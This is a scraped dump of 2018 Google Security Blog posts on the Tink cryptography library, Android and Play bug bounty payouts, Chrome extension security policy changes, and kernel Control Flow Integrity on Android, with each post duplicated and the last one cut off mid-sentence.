automated tools to quickly discover usages where the security guarantees don&#8217;t match the security requirements. Tink also isolates APIs for potentially dangerous operations (e.g., loading cleartext keys from disk), which allows discovering, restricting, monitoring and logging their usage.    Tink provides support for key management, including key rotation and phasing out deprecated ciphers. For example, if a cryptographic primitive is found to be broken, you can switch to a different primitive by rotating keys, without changing or recompiling code.    Tink is also extensible by design: it is easy to add a custom cryptographic scheme or an in-house key management system so that it works seamlessly with other parts of Tink. No part of Tink is hard to replace or remove. All components are composable, and can be selected and assembled in various combinations. For example, if you need only digital signatures, you can exclude symmetric key encryption components to minimize code size in your application.    To get started, please check out our HOW-TO for  Java ,  C++  and  Obj-C . If you'd like to talk to the developers or get notified about project updates, you may want to subscribe to our  mailing list . To join, simply send an empty email to  tink-users+subscribe@googlegroups.com . You can also post your questions to StackOverflow, just remember to tag them with  tink .    We&#8217;re excited to share this with the community, and welcome your feedback!                                   Posted by Thai Duong, Information Security Engineer, on behalf of Tink team  At Google, many product teams use cryptographic techniques to protect user data. In cryptography, subtle mistakes can have serious consequences, and understanding how to implement cryptography correctly requires digesting decades' worth of academic literature. Needless to say, many developers don’t have time for that.  To help our developers ship secure cryptographic code we’ve developed Tink—a multi-language, cross-platform cryptographic library. We believe in open source and want Tink to become a community project—thus Tink has been available on GitHub since the early days of the project, and it has already attracted several external contributors. At Google, Tink is already being used to secure data of many products such as AdMob, Google Pay, Google Assistant, Firebase, the Android Search App, etc. After nearly two years of development, today we’re excited to announce Tink 1.2.0, the first version that supports cloud, Android, iOS, and more!  Tink aims to provide cryptographic APIs that are secure, easy to use correctly, and hard(er) to misuse. Tink is built on top of existing libraries such as BoringSSL and Java Cryptography Architecture, but includes countermeasures to many weaknesses in these libraries, which were discovered by Project Wycheproof, another project from our team.  With Tink, many common cryptographic operations such as data encryption, digital signatures, etc. can be done with only a few lines of code. Here is an example of encrypting and decrypting with our AEAD interface in Java:    import com.google.crypto.tink.Aead;      import com.google.crypto.tink.KeysetHandle;      import com.google.crypto.tink.aead.AeadFactory;      import com.google.crypto.tink.aead.AeadKeyTemplates;        // 1. Generate the key material.      KeysetHandle keysetHandle = KeysetHandle.generateNew(          AeadKeyTemplates.AES256_EAX);        // 2. Get the primitive.      Aead aead = AeadFactory.getPrimitive(keysetHandle);        // 3. Use the primitive.      byte[] plaintext = ...;      byte[] additionalData = ...;     byte[] ciphertext = aead.encrypt(plaintext, additionalData);  Tink aims to eliminate as many potential misuses as possible. For example, if the underlying encryption mode requires nonces and nonce reuse makes it insecure, then Tink does not allow the user to pass nonces. Interfaces have security guarantees that must be satisfied by each primitive implementing the interface. This may exclude some encryption modes. Rather than adding them to existing interfaces and weakening the guarantees of the interface, it is possible to add new interfaces and describe the security guarantees appropriately.  We’re cryptographers and security engineers working to improve Google’s product security, so we built Tink to make our job easier. Tink shows the claimed security properties (e.g., safe against chosen-ciphertext attacks) right in the interfaces, allowing security auditors and automated tools to quickly discover usages where the security guarantees don’t match the security requirements. Tink also isolates APIs for potentially dangerous operations (e.g., loading cleartext keys from disk), which allows discovering, restricting, monitoring and logging their usage.  Tink provides support for key management, including key rotation and phasing out deprecated ciphers. For example, if a cryptographic primitive is found to be broken, you can switch to a different primitive by rotating keys, without changing or recompiling code.  Tink is also extensible by design: it is easy to add a custom cryptographic scheme or an in-house key management system so that it works seamlessly with other parts of Tink. No part of Tink is hard to replace or remove. All components are composable, and can be selected and assembled in various combinations. For example, if you need only digital signatures, you can exclude symmetric key encryption components to minimize code size in your application.  To get started, please check out our HOW-TO for Java, C++ and Obj-C. If you'd like to talk to the developers or get notified about project updates, you may want to subscribe to our mailing list. To join, simply send an empty email to tink-users+subscribe@googlegroups.com. You can also post your questions to StackOverflow, just remember to tag them with tink.  We’re excited to share this with the community, and welcome your feedback!     ", "date": "August 30, 2018"},
{"website": "Google-Security", "title": "\nAndroid and Google Play Security Rewards Programs surpass $3M in payouts\n", "author": [], "link": "https://security.googleblog.com/2018/09/android-and-google-play-security_20.html", "abstract": "                                 table, th, td {    border: 1px solid black; } td { width:100px; }      Posted by Jason Woloz and Mayank Jain, Android Security &amp; Privacy Team      [Cross-posted from the  Android Developers Blog ]    Our Android and Play security reward  programs help us work with top researchers from around the world to improve Android ecosystem security every day. Thank you to all the amazing  researchers  who submitted  vulnerability reports .          Android Security Rewards  In the ASR program's third year, we received over 470 qualifying vulnerability reports from researchers and the average pay per researcher jumped by 23%. To date, the ASR program has rewarded researchers with over $3M, paying out roughly $1M per year.    Here are some of the highlights from the Android Security Rewards program's third year:      There were no payouts for our highest possible reward: a complete remote exploit chain leading to TrustZone or Verified Boot compromise.     99 individuals contributed one or more fixes.      The ASR program's reward averages were $2,600 per reward and $12,500 per researcher.     Guang Gong received our highest reward amount to date: $105,000 for his submission of a  remote exploit chain .      As part of our ongoing commitment to security we regularly update our programs and policies based on ecosystem feedback. We also updated our  severity guidelines  for evaluating the impact of reported security vulnerabilities against the Android platform.           Google Play Security Rewards  In October 2017, we rolled out the  Google Play Security Reward Program  to encourage security research into popular Android apps available on Google Play. So far, researchers have reported over 30 vulnerabilities through the program, earning a combined bounty amount of over $100K.    If undetected, these vulnerabilities could have potentially led to elevation of privilege, access to sensitive data and remote code execution on devices.          Keeping devices secure  In addition to rewarding for vulnerabilities, we continue to work with the broad and diverse Android ecosystem to protect users from issues reported through our program. We collaborate with manufacturers to ensure that these issues are fixed on their devices through monthly  security updates . Over 250 device models have a majority of their deployed devices running a security update from the last 90 days. This table shows the models with a majority of deployed devices running a security update from the last three months:               Manufacturer      Device         ANS     L50        Asus     ZenFone 5Z (ZS620KL/ZS621KL), ZenFone Max Plus M1 (ZB570TL), ZenFone 4 Pro (ZS551KL), ZenFone 5 (ZE620KL), ZenFone Max M1 (ZB555KL), ZenFone 4 (ZE554KL), ZenFone 4 Selfie Pro (ZD552KL), ZenFone 3 (ZE552KL), ZenFone 3 Zoom (ZE553KL), ZenFone 3 (ZE520KL), ZenFone 3 Deluxe (ZS570KL), ZenFone 4 Selfie (ZD553KL), ZenFone Live L1 (ZA550KL), ZenFone 5 Lite (ZC600KL), ZenFone 3s Max (ZC521TL)        BlackBerry     BlackBerry MOTION, BlackBerry KEY2        Blu     Grand XL LTE, Vivo ONE, R2_3G, Grand_M2, BLU STUDIO J8 LTE        bq     Aquaris V Plus, Aquaris V, Aquaris U2 Lite, Aquaris U2, Aquaris X, Aquaris X2, Aquaris X Pro, Aquaris U Plus, Aquaris X5 Plus, Aquaris U lite, Aquaris U        Docomo     F-04K, F-05J, F-03H        Essential Products     PH-1        Fujitsu     F-01K        General Mobile     GM8, GM8 Go        Google     Pixel 2 XL, Pixel 2, Pixel XL, Pixel        HTC     U12+, HTC U11+        Huawei     Honor Note10, nova 3, nova 3i, Huawei Nova 3I, 荣耀9i, 华为G9青春版, Honor Play, G9青春版, P20 Pro, Honor V9, huawei nova 2, P20 lite, Honor 10, Honor 8 Pro, Honor 6X, Honor 9, nova 3e, P20, PORSCHE DESIGN HUAWEI Mate RS, FRD-L02, HUAWEI Y9 2018, Huawei Nova 2, Honor View 10, HUAWEI P20 Lite, Mate 9 Pro, Nexus 6P, HUAWEI Y5 2018, Honor V10, Mate 10 Pro, Mate 9, Honor 9, Lite, 荣耀9青春版, nova 2i, HUAWEI nova 2 Plus, P10 lite, nova 青春版本, FIG-LX1, HUAWEI G Elite Plus, HUAWEI Y7 2018, Honor 7S, HUAWEI P smart, P10, Honor 7C, 荣耀8青春版, HUAWEI Y7 Prime 2018, P10 Plus, 荣耀畅玩7X, HUAWEI Y6 2018, Mate 10 lite, Honor 7A, P9 Plus, 华为畅享8, honor 6x, HUAWEI P9 lite mini, HUAWEI GR5 2017, Mate 10        Itel     P13        Kyocera     X3        Lanix     Alpha_950, Ilium X520        Lava     Z61, Z50        LGE     LG Q7+, LG G7 ThinQ, LG Stylo 4, LG K30, V30+, LG V35 ThinQ, Stylo 2 V, LG K20 V, ZONE4, LG Q7, DM-01K, Nexus 5X, LG K9, LG K11        Motorola     Moto Z Play Droid, moto g(6) plus, Moto Z Droid, Moto X (4), Moto G Plus (5th Gen), Moto Z (2) Force, Moto G (5S) Plus, Moto G (5) Plus, moto g(6) play, Moto G (5S), moto e5 play, moto e(5) play, moto e(5) cruise, Moto E4, Moto Z Play, Moto G (5th Gen)        Nokia     Nokia 8, Nokia 7 plus, Nokia 6.1, Nokia 8 Sirocco, Nokia X6, Nokia 3.1        OnePlus     OnePlus 6, OnePlus5T, OnePlus3T, OnePlus5, OnePlus3        Oppo     CPH1803, CPH1821, CPH1837, CPH1835, CPH1819, CPH1719, CPH1613, CPH1609, CPH1715, CPH1861, CPH1831, CPH1801, CPH1859, A83, R9s Plus        Positivo     Twist, Twist Mini        Samsung     Galaxy A8 Star, Galaxy J7 Star, Galaxy Jean, Galaxy On6, Galaxy Note9, Galaxy J3 V, Galaxy A9 Star, Galaxy J7 V, Galaxy S8 Active, Galaxy Wide3, Galaxy J3 Eclipse, Galaxy S9+, Galaxy S9, Galaxy A9 Star Lite, Galaxy J7 Refine, Galaxy J7 Max, Galaxy Wide2, Galaxy J7(2017), Galaxy S8+, Galaxy S8, Galaxy A3(2017), Galaxy Note8, Galaxy A8+(2018), Galaxy J3 Top, Galaxy J3 Emerge, Galaxy On Nxt, Galaxy J3 Achieve, Galaxy A5(2017), Galaxy J2(2016), Galaxy J7 Pop, Galaxy A6, Galaxy J7 Pro, Galaxy A6 Plus, Galaxy Grand Prime Pro, Galaxy J2 (2018), Galaxy S6 Active, Galaxy A8(2018), Galaxy J3 Pop, Galaxy J3 Mission, Galaxy S6 edge+, Galaxy Note Fan Edition, Galaxy J7 Prime, Galaxy A5(2016)        Sharp     シンプルスマホ４, AQUOS sense plus (SH-M07), AQUOS R2 SH-03K, X4, AQUOS R SH-03J, AQUOS R2 SHV42, X1, AQUOS sense lite (SH-M05)        Sony     Xperia XZ2 Premium, Xperia XZ2 Compact, Xperia XA2, Xperia XA2 Ultra, Xperia XZ1 Compact, Xperia XZ2, Xperia XZ Premium, Xperia XZ1, Xperia L2, Xperia X        Tecno     F1, CAMON I Ace        Vestel     Vestel Z20        Vivo     vivo 1805, vivo 1803, V9 6GB, Y71, vivo 1802, vivo Y85A, vivo 1726, vivo 1723, V9, vivo 1808, vivo 1727, vivo 1724, vivo X9s Plus, Y55s, vivo 1725, Y66, vivo 1714, 1609, 1601        Vodafone     Vodafone Smart N9        Xiaomi     Mi A2, Mi A2 Lite, MI 8, MI 8 SE, MIX 2S, Redmi 6Pro, Redmi Note 5 Pro, Redmi Note 5, Mi A1, Redmi S2, MI MAX 2, MI 6X        ZTE     BLADE A6 MAX          Thank you to everyone internally and  externally  who helped make Android safer and stronger in the past year. Together, we made a huge investment in security research that helps Android users everywhere. If you want to get involved to make next year even better, check out our detailed  program rules . For tips on how to submit complete reports, see  Bug Hunter University .                                       table, th, td {    border: 1px solid black; } td { width:100px; }   Posted by Jason Woloz and Mayank Jain, Android Security & Privacy Team   [Cross-posted from the Android Developers Blog]  Our Android and Play security reward  programs help us work with top researchers from around the world to improve Android ecosystem security every day. Thank you to all the amazing researchers who submitted vulnerability reports.     Android Security Rewards In the ASR program's third year, we received over 470 qualifying vulnerability reports from researchers and the average pay per researcher jumped by 23%. To date, the ASR program has rewarded researchers with over $3M, paying out roughly $1M per year.   Here are some of the highlights from the Android Security Rewards program's third year:   There were no payouts for our highest possible reward: a complete remote exploit chain leading to TrustZone or Verified Boot compromise.   99 individuals contributed one or more fixes.    The ASR program's reward averages were $2,600 per reward and $12,500 per researcher.   Guang Gong received our highest reward amount to date: $105,000 for his submission of a remote exploit chain.    As part of our ongoing commitment to security we regularly update our programs and policies based on ecosystem feedback. We also updated our severity guidelines for evaluating the impact of reported security vulnerabilities against the Android platform.      Google Play Security Rewards In October 2017, we rolled out the Google Play Security Reward Program to encourage security research into popular Android apps available on Google Play. So far, researchers have reported over 30 vulnerabilities through the program, earning a combined bounty amount of over $100K.   If undetected, these vulnerabilities could have potentially led to elevation of privilege, access to sensitive data and remote code execution on devices.     Keeping devices secure In addition to rewarding for vulnerabilities, we continue to work with the broad and diverse Android ecosystem to protect users from issues reported through our program. We collaborate with manufacturers to ensure that these issues are fixed on their devices through monthly security updates. Over 250 device models have a majority of their deployed devices running a security update from the last 90 days. This table shows the models with a majority of deployed devices running a security update from the last three months:    ManufacturerDevice ANSL50 AsusZenFone 5Z (ZS620KL/ZS621KL), ZenFone Max Plus M1 (ZB570TL), ZenFone 4 Pro (ZS551KL), ZenFone 5 (ZE620KL), ZenFone Max M1 (ZB555KL), ZenFone 4 (ZE554KL), ZenFone 4 Selfie Pro (ZD552KL), ZenFone 3 (ZE552KL), ZenFone 3 Zoom (ZE553KL), ZenFone 3 (ZE520KL), ZenFone 3 Deluxe (ZS570KL), ZenFone 4 Selfie (ZD553KL), ZenFone Live L1 (ZA550KL), ZenFone 5 Lite (ZC600KL), ZenFone 3s Max (ZC521TL) BlackBerryBlackBerry MOTION, BlackBerry KEY2 BluGrand XL LTE, Vivo ONE, R2_3G, Grand_M2, BLU STUDIO J8 LTE bqAquaris V Plus, Aquaris V, Aquaris U2 Lite, Aquaris U2, Aquaris X, Aquaris X2, Aquaris X Pro, Aquaris U Plus, Aquaris X5 Plus, Aquaris U lite, Aquaris U DocomoF-04K, F-05J, F-03H Essential ProductsPH-1 FujitsuF-01K General MobileGM8, GM8 Go GooglePixel 2 XL, Pixel 2, Pixel XL, Pixel HTCU12+, HTC U11+ HuaweiHonor Note10, nova 3, nova 3i, Huawei Nova 3I, 荣耀9i, 华为G9青春版, Honor Play, G9青春版, P20 Pro, Honor V9, huawei nova 2, P20 lite, Honor 10, Honor 8 Pro, Honor 6X, Honor 9, nova 3e, P20, PORSCHE DESIGN HUAWEI Mate RS, FRD-L02, HUAWEI Y9 2018, Huawei Nova 2, Honor View 10, HUAWEI P20 Lite, Mate 9 Pro, Nexus 6P, HUAWEI Y5 2018, Honor V10, Mate 10 Pro, Mate 9, Honor 9, Lite, 荣耀9青春版, nova 2i, HUAWEI nova 2 Plus, P10 lite, nova 青春版本, FIG-LX1, HUAWEI G Elite Plus, HUAWEI Y7 2018, Honor 7S, HUAWEI P smart, P10, Honor 7C, 荣耀8青春版, HUAWEI Y7 Prime 2018, P10 Plus, 荣耀畅玩7X, HUAWEI Y6 2018, Mate 10 lite, Honor 7A, P9 Plus, 华为畅享8, honor 6x, HUAWEI P9 lite mini, HUAWEI GR5 2017, Mate 10 ItelP13 KyoceraX3 LanixAlpha_950, Ilium X520 LavaZ61, Z50 LGELG Q7+, LG G7 ThinQ, LG Stylo 4, LG K30, V30+, LG V35 ThinQ, Stylo 2 V, LG K20 V, ZONE4, LG Q7, DM-01K, Nexus 5X, LG K9, LG K11 MotorolaMoto Z Play Droid, moto g(6) plus, Moto Z Droid, Moto X (4), Moto G Plus (5th Gen), Moto Z (2) Force, Moto G (5S) Plus, Moto G (5) Plus, moto g(6) play, Moto G (5S), moto e5 play, moto e(5) play, moto e(5) cruise, Moto E4, Moto Z Play, Moto G (5th Gen) NokiaNokia 8, Nokia 7 plus, Nokia 6.1, Nokia 8 Sirocco, Nokia X6, Nokia 3.1 OnePlusOnePlus 6, OnePlus5T, OnePlus3T, OnePlus5, OnePlus3 OppoCPH1803, CPH1821, CPH1837, CPH1835, CPH1819, CPH1719, CPH1613, CPH1609, CPH1715, CPH1861, CPH1831, CPH1801, CPH1859, A83, R9s Plus PositivoTwist, Twist Mini SamsungGalaxy A8 Star, Galaxy J7 Star, Galaxy Jean, Galaxy On6, Galaxy Note9, Galaxy J3 V, Galaxy A9 Star, Galaxy J7 V, Galaxy S8 Active, Galaxy Wide3, Galaxy J3 Eclipse, Galaxy S9+, Galaxy S9, Galaxy A9 Star Lite, Galaxy J7 Refine, Galaxy J7 Max, Galaxy Wide2, Galaxy J7(2017), Galaxy S8+, Galaxy S8, Galaxy A3(2017), Galaxy Note8, Galaxy A8+(2018), Galaxy J3 Top, Galaxy J3 Emerge, Galaxy On Nxt, Galaxy J3 Achieve, Galaxy A5(2017), Galaxy J2(2016), Galaxy J7 Pop, Galaxy A6, Galaxy J7 Pro, Galaxy A6 Plus, Galaxy Grand Prime Pro, Galaxy J2 (2018), Galaxy S6 Active, Galaxy A8(2018), Galaxy J3 Pop, Galaxy J3 Mission, Galaxy S6 edge+, Galaxy Note Fan Edition, Galaxy J7 Prime, Galaxy A5(2016) Sharpシンプルスマホ４, AQUOS sense plus (SH-M07), AQUOS R2 SH-03K, X4, AQUOS R SH-03J, AQUOS R2 SHV42, X1, AQUOS sense lite (SH-M05) SonyXperia XZ2 Premium, Xperia XZ2 Compact, Xperia XA2, Xperia XA2 Ultra, Xperia XZ1 Compact, Xperia XZ2, Xperia XZ Premium, Xperia XZ1, Xperia L2, Xperia X TecnoF1, CAMON I Ace VestelVestel Z20 Vivovivo 1805, vivo 1803, V9 6GB, Y71, vivo 1802, vivo Y85A, vivo 1726, vivo 1723, V9, vivo 1808, vivo 1727, vivo 1724, vivo X9s Plus, Y55s, vivo 1725, Y66, vivo 1714, 1609, 1601 VodafoneVodafone Smart N9 XiaomiMi A2, Mi A2 Lite, MI 8, MI 8 SE, MIX 2S, Redmi 6Pro, Redmi Note 5 Pro, Redmi Note 5, Mi A1, Redmi S2, MI MAX 2, MI 6X ZTEBLADE A6 MAX   Thank you to everyone internally and externally who helped make Android safer and stronger in the past year. Together, we made a huge investment in security research that helps Android users everywhere. If you want to get involved to make next year even better, check out our detailed program rules. For tips on how to submit complete reports, see Bug Hunter University.     ", "date": "September 20, 2018"},
{"website": "Google-Security", "title": "\nTrustworthy Chrome Extensions, by Default\n", "author": ["Posted by James Wagner, Chrome Extensions Product Manager"], "link": "https://security.googleblog.com/2018/10/trustworthy-chrome-extensions-by-default.html", "abstract": "                             Posted by James Wagner, Chrome Extensions Product Manager      [Cross-posted from the  Chromium blog ]       Incredibly, it&#8217;s been nearly a decade since we launched the Chrome extensions system. Thanks to the hard work and innovation of our developer community, there are now more than 180,000 extensions in the  Chrome Web Store , and nearly half of Chrome desktop users actively use extensions to customize Chrome and their experience on the web.    The extensions team's dual mission is to help users tailor Chrome&#8217;s functionality to their individual needs and interests, and to empower developers to build rich and useful extensions. But, first and foremost, it&#8217;s crucial that users be able to trust the extensions they install are safe, privacy-preserving, and performant. Users should always have full transparency about the scope of their extensions&#8217; capabilities and data access.    We&#8217;ve recently taken a number of steps toward improved extension security with the launch of  out-of-process iframes , the  removal of inline installation , and significant advancements in our ability to detect and block malicious extensions using machine learning. Looking ahead, there are more fundamental changes needed so that all Chrome extensions are trustworthy by default.    Today we&#8217;re announcing some upcoming changes and plans for the future:     User controls for host permissions     Beginning in Chrome 70, users will have the choice to restrict extension  host access  to a custom list of sites, or to configure extensions to require a click to gain access to the current page.                  While host permissions have enabled thousands of powerful and creative extension use cases, they have also led to a broad range of misuse - both malicious and unintentional - because they allow extensions to automatically read and change data on websites. Our aim is to improve user transparency and control over when extensions are able to access site data. In subsequent milestones, we&#8217;ll continue to optimize the user experience toward this goal while improving usability. If your extension requests host permissions, we encourage you to review our  transition guide  and begin testing as soon as possible.     Changes to the extensions review process       Going forward, extensions that request powerful permissions will be subject to additional compliance review. We&#8217;re also looking very closely at extensions that use remotely hosted code, with ongoing monitoring. Your extension&#8217;s permissions should be as  narrowly-scoped  as possible, and all your code should be included directly in the extension package, to minimize review time.   New code reliability requirements       Starting today, Chrome Web Store will no longer allow extensions with obfuscated code. This includes code within the extension package as well as any external code or resource fetched from the web. This policy applies immediately to all new extension submissions. Existing extensions with obfuscated code can continue to submit updates over the next 90 days, but will be removed from the Chrome Web Store in early January if not compliant.    Today over 70% of malicious and policy violating extensions that we block from Chrome Web Store contain obfuscated code. At the same time, because obfuscation is mainly used to conceal code functionality, it adds a great deal of complexity to our review process. This is no longer acceptable given the aforementioned review process changes.    Additionally, since JavaScript code is always running locally on the user's machine, obfuscation is insufficient to protect proprietary code from a truly motivated reverse engineer. Obfuscation techniques also come with hefty performance costs such as slower execution and increased file and memory footprints.    Ordinary minification, on the other hand, typically speeds up code execution as it reduces code size, and is much more straightforward to review. Thus, minification will still be allowed, including the following techniques:       Removal of whitespace, newlines, code comments, and block delimiters   Shortening of variable and function names   Collapsing the number of JavaScript files      If you have an extension in the store with obfuscated code, please review our updated  content policies  as well as our  recommended minification techniques  for Google Developers, and submit a new compliant version before January 1st, 2019.                 Required 2-step verification            In 2019, enrollment in  2-Step Verification  will be required for Chrome Web Store developer accounts. If your extension becomes popular, it can attract attackers who want to steal it by hijacking your account, and 2-Step Verification adds an extra layer of security by requiring a second authentication step from your phone or a  physical security key . We strongly recommend that you  enroll  as soon as possible.         For even stronger account security, consider the  Advanced Protection Program . Advanced protection offers the same level of security that Google relies on for its own employees, requiring a physical security key to provide the strongest defense against phishing attacks.                 Looking ahead: Manifest v3          In 2019 we will introduce the next extensions manifest version. Manifest v3 will entail additional platform changes that aim to create stronger security, privacy, and performance guarantees. We want to help all developers  fall into the pit of success ; writing a secure and performant extension in Manifest v3 should be easy, while writing an insecure or non-performant extension should be difficult.         Some key goals of manifest v3 include:       More narrowly-scoped and declarative APIs, to decrease the need for overly-broad access and enable more performant implementation by the browser, while preserving important functionality   Additional, easier mechanisms for users to control the permissions granted to extensions   Modernizing to align with new web capabilities, such as supporting Service Workers as a new type of background process    We intend to make the transition to manifest v3 as smooth as possible and we&#8217;re thinking carefully about the rollout plan. We&#8217;ll be in touch soon with more specific details.         We recognize that some of the changes announced today may require effort in the future, depending on your extension. But we believe the collective result will be worth that effort for all users, developers, and for the long term health of the Chrome extensions ecosystem. We&#8217;re committed to working with you to transition through these changes and are very interested in your feedback. If you have questions or comments, please get in touch with us on the  Chromium extensions forum .                                     Posted by James Wagner, Chrome Extensions Product Manager  [Cross-posted from the Chromium blog]    Incredibly, it’s been nearly a decade since we launched the Chrome extensions system. Thanks to the hard work and innovation of our developer community, there are now more than 180,000 extensions in the Chrome Web Store, and nearly half of Chrome desktop users actively use extensions to customize Chrome and their experience on the web.  The extensions team's dual mission is to help users tailor Chrome’s functionality to their individual needs and interests, and to empower developers to build rich and useful extensions. But, first and foremost, it’s crucial that users be able to trust the extensions they install are safe, privacy-preserving, and performant. Users should always have full transparency about the scope of their extensions’ capabilities and data access.  We’ve recently taken a number of steps toward improved extension security with the launch of out-of-process iframes, the removal of inline installation, and significant advancements in our ability to detect and block malicious extensions using machine learning. Looking ahead, there are more fundamental changes needed so that all Chrome extensions are trustworthy by default.  Today we’re announcing some upcoming changes and plans for the future:  User controls for host permissions  Beginning in Chrome 70, users will have the choice to restrict extension host access to a custom list of sites, or to configure extensions to require a click to gain access to the current page.      While host permissions have enabled thousands of powerful and creative extension use cases, they have also led to a broad range of misuse - both malicious and unintentional - because they allow extensions to automatically read and change data on websites. Our aim is to improve user transparency and control over when extensions are able to access site data. In subsequent milestones, we’ll continue to optimize the user experience toward this goal while improving usability. If your extension requests host permissions, we encourage you to review our transition guide and begin testing as soon as possible.  Changes to the extensions review process  Going forward, extensions that request powerful permissions will be subject to additional compliance review. We’re also looking very closely at extensions that use remotely hosted code, with ongoing monitoring. Your extension’s permissions should be as narrowly-scoped as possible, and all your code should be included directly in the extension package, to minimize review time. New code reliability requirements  Starting today, Chrome Web Store will no longer allow extensions with obfuscated code. This includes code within the extension package as well as any external code or resource fetched from the web. This policy applies immediately to all new extension submissions. Existing extensions with obfuscated code can continue to submit updates over the next 90 days, but will be removed from the Chrome Web Store in early January if not compliant.  Today over 70% of malicious and policy violating extensions that we block from Chrome Web Store contain obfuscated code. At the same time, because obfuscation is mainly used to conceal code functionality, it adds a great deal of complexity to our review process. This is no longer acceptable given the aforementioned review process changes.  Additionally, since JavaScript code is always running locally on the user's machine, obfuscation is insufficient to protect proprietary code from a truly motivated reverse engineer. Obfuscation techniques also come with hefty performance costs such as slower execution and increased file and memory footprints.  Ordinary minification, on the other hand, typically speeds up code execution as it reduces code size, and is much more straightforward to review. Thus, minification will still be allowed, including the following techniques:   Removal of whitespace, newlines, code comments, and block delimiters Shortening of variable and function names Collapsing the number of JavaScript files   If you have an extension in the store with obfuscated code, please review our updated content policies as well as our recommended minification techniques for Google Developers, and submit a new compliant version before January 1st, 2019.      Required 2-step verification    In 2019, enrollment in 2-Step Verification will be required for Chrome Web Store developer accounts. If your extension becomes popular, it can attract attackers who want to steal it by hijacking your account, and 2-Step Verification adds an extra layer of security by requiring a second authentication step from your phone or a physical security key. We strongly recommend that you enroll as soon as possible.    For even stronger account security, consider the Advanced Protection Program. Advanced protection offers the same level of security that Google relies on for its own employees, requiring a physical security key to provide the strongest defense against phishing attacks.      Looking ahead: Manifest v3    In 2019 we will introduce the next extensions manifest version. Manifest v3 will entail additional platform changes that aim to create stronger security, privacy, and performance guarantees. We want to help all developers fall into the pit of success; writing a secure and performant extension in Manifest v3 should be easy, while writing an insecure or non-performant extension should be difficult.    Some key goals of manifest v3 include:   More narrowly-scoped and declarative APIs, to decrease the need for overly-broad access and enable more performant implementation by the browser, while preserving important functionality Additional, easier mechanisms for users to control the permissions granted to extensions Modernizing to align with new web capabilities, such as supporting Service Workers as a new type of background process  We intend to make the transition to manifest v3 as smooth as possible and we’re thinking carefully about the rollout plan. We’ll be in touch soon with more specific details.    We recognize that some of the changes announced today may require effort in the future, depending on your extension. But we believe the collective result will be worth that effort for all users, developers, and for the long term health of the Chrome extensions ecosystem. We’re committed to working with you to transition through these changes and are very interested in your feedback. If you have questions or comments, please get in touch with us on the Chromium extensions forum.     ", "date": "October 1, 2018"},
{"website": "Google-Security", "title": "\nControl Flow Integrity in the Android kernel\n", "author": [], "link": "https://security.googleblog.com/2018/10/posted-by-sami-tolvanen-staff-software.html", "abstract": "                                 Posted by Sami Tolvanen, Staff Software Engineer, Android Security & Privacy       [Cross-posted from the  Android Developers Blog ]     Android's security model is enforced by the Linux kernel, which makes it a tempting target for attackers. We have put a lot of effort into  hardening the kernel  in previous Android releases and in Android 9, we continued this work by focusing on  compiler-based security mitigations  against code reuse attacks.   Google's Pixel 3 will be the first Android device to ship with LLVM's forward-edge  Control Flow Integrity (CFI)  enforcement in the kernel, and we have made  CFI support available in Android kernel versions 4.9 and 4.14 . This post describes how kernel CFI works and provides solutions to the most common issues developers might run into when enabling the feature.      Protecting against code reuse attacks   A common method of exploiting the kernel is using a bug to overwrite a function pointer stored in memory, such as a stored callback pointer or a return address that had been pushed to the stack. This allows an attacker to execute arbitrary parts of the kernel code to complete their exploit, even if they cannot inject executable code of their own. This method of gaining code execution is particularly popular with the kernel because of the huge number of function pointers it uses, and the existing memory protections that make code injection more challenging.   CFI attempts to mitigate these attacks by adding additional checks to confirm that the kernel's control flow stays within a precomputed graph. This doesn't prevent an attacker from changing a function pointer if a bug provides write access to one, but it significantly restricts the valid call targets, which makes exploiting such a bug more difficult in practice.          Figure 1. In an Android device kernel, LLVM's CFI limits 55% of indirect calls to at most 5 possible targets and 80% to at most 20 targets.     Gaining full program visibility with Link Time Optimization (LTO)   In order to determine all valid call targets for each indirect branch, the compiler needs to see all of the kernel code at once. Traditionally, compilers work on a single compilation unit (source file) at a time and leave merging the object files to the linker. LLVM's solution to CFI is to require the use of LTO, where the compiler produces LLVM-specific bitcode for all C compilation units, and an LTO-aware linker uses the LLVM back-end to combine the bitcode and compile it into native code.          Figure 2. A simplified overview of how LTO works in the kernel. All LLVM bitcode is combined, optimized, and generated into native code at link time.  Linux has used the GNU toolchain for assembling, compiling, and linking the kernel for decades. While we continue to use the GNU assembler for stand-alone assembly code, LTO requires us to switch to LLVM's integrated assembler for inline assembly, and either GNU gold or LLVM's own lld as the linker. Switching to a relatively untested toolchain on a huge software project will lead to compatibility issues, which we have addressed in our arm64 LTO patch sets for kernel versions  4.9  and  4.14 .   In addition to making CFI possible, LTO also produces faster code due to global optimizations. However, additional optimizations often result in a larger binary size, which may be undesirable on devices with very limited resources. Disabling LTO-specific optimizations, such as global inlining and loop unrolling, can reduce binary size by sacrificing some of the performance gains. When using GNU gold, the aforementioned optimizations can be disabled with the following additions to LDFLAGS:    LDFLAGS += -plugin-opt=-inline-threshold=0 \\            -plugin-opt=-unroll-threshold=0  Note that flags to disable individual optimizations are not part of the stable LLVM interface and may change in future compiler versions.      Implementing CFI in the Linux kernel    LLVM's CFI  implementation adds a check before each indirect branch to confirm that the target address points to a valid function with a correct signature. This prevents an indirect branch from jumping to an arbitrary code location and even limits the functions that can be called. As C compilers do not enforce similar restrictions on indirect branches, there were several CFI violations due to function type declaration mismatches even in the core kernel that we have addressed in our CFI patch sets for kernels  4.9  and  4.14 .   Kernel modules add another complication to CFI, as they are loaded at runtime and can be compiled independently from the rest of the kernel. In order to support loadable modules, we have implemented LLVM's  cross-DSO CFI  support in the kernel, including a CFI shadow that speeds up cross-module look-ups. When compiled with cross-DSO support, each kernel module contains information about valid local branch targets, and the kernel looks up information from the correct module based on the target address and the modules' memory layout.          Figure 3. An example of a cross-DSO CFI check injected into an arm64 kernel. Type information is passed in X0 and the target address to validate in X1.  CFI checks naturally add some overhead to indirect branches, but due to more aggressive optimizations, our tests show that the impact is minimal, and overall system performance even improved 1-2% in many cases.      Enabling kernel CFI for an Android device   CFI for arm64 requires clang version &gt;= 5.0 and binutils &gt;= 2.27. The kernel build system also assumes that the LLVMgold.so plug-in is available in LD_LIBRARY_PATH. Pre-built toolchain binaries for  clang  and  binutils  are available in AOSP, but upstream binaries can also be used.   The following kernel configuration options are needed to enable kernel CFI:    CONFIG_LTO_CLANG=y CONFIG_CFI_CLANG=y  Using CONFIG_CFI_PERMISSIVE=y may also prove helpful when debugging a CFI violation or during device bring-up. This option turns a violation into a warning instead of a kernel panic.   As mentioned in the previous section, the most common issue we ran into when enabling CFI on Pixel 